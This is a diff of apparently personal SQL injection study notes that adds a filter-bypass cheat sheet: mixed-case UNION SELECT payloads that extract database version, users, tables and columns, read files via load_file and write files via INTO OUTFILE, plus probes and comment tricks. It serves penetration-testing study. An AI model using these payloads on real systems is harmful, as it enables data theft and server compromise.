@@ -353,7 +353,7 @@ You can query `information_schema.tables` to list the tables in the database:
 
 This returns output like the following:
 
-## \`TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME TABLE\_TYPE
+## TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME TABLE\_TYPE
 
 MyDatabase dbo Products BASE TABLE  
 MyDatabase dbo Users BASE TABLE  
@@ -367,7 +367,7 @@ You can then query `information_schema.columns` to list the columns in individua
 
 This returns output like the following:
 
-## \`TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME COLUMN\_NAME DATA\_TYPE
+## TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME COLUMN\_NAME DATA\_TYPE
 
 MyDatabase dbo Users UserId int  
 MyDatabase dbo Users Username varchar  
@@ -406,7 +406,7 @@ https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?categor
 
 My simple cheatsheet:
 
-```text
+```http
 # Check SQL Feedback/Return
 ?id='
 
@@ -439,7 +439,7 @@ My simple cheatsheet:
 
 This cheat sheet is from [here](https://github.com/areyou1or0/OSCP/blob/master/Web).
 
-```text
+```http
 # SQL Injection (manual)
 photoalbum.php?id=1'
 
@@ -476,5 +476,83 @@ photoalbum.php?id=1 order by 8
 ' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -
 ```
 
+Bypass filters:
 
+```sql
+// Syntax:
+UniOn selEct [número de columnas] [comentario]
+
+
+// Ejemplos: Supondremos que hay 2 columnas y la columna 2 se puede usar para mostrar datos en la pantalla.
+
+// Select the version of the database:
+UniOn selEct 1,version() /*
+
+// Database being used:
+UniOn selEct 1,database() /*
+
+// Database user:
+UniOn selEct 1,user() /*
+
+// Database tables:
+UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[nombre de la base de datos]' /*
+
+// Table columns:
+UniOn selEct 1,column_name frOm information_schema.columns table_name = '[nombre de la tabla]' /*
+
+// Select data from table:
+UniOn selEct 1,[nombre de la columna] frOm [nombre de la tabla] /*
+
+// Read files:
+UniOn selEct 1,load_file('ubicación del archivo') /*
+
+// Write files:
+UniOn selEct null,[contenido del archivo] inTo outfile '/ubicacion/donde/escribir/el/archivo' /*
+```
+
+Examples of TRUE statements to discover SQLi:
+
+```sql
+aNd 1=1
+aNd 21=21
+orDeR bY 1
+```
+
+Examples of FALSE statements:
+
+```sql
+dNd 0=1
+anD 9=2
+ordEr bY 1000000000000
+```
+
+Characters to use instead of spaces:
+
+```sql
++, /**/, %20
+```
+
+Examples, orDeR bY 1 can be rewritten as:
+
+```sql
+orDer+bY+1
+orDer/**/bY/**/1
+orDer%20bY%201
+```
+
+Comments to finalize the consultations:
+
+```sql
+/*
+//
+#
+%23
+```
+
+> Note: Sometimes you may need to add ';' before the comment, examples:
+>
+> ```sql
+> anD 1=1//
+> anD 1=1;//
+> ```
 
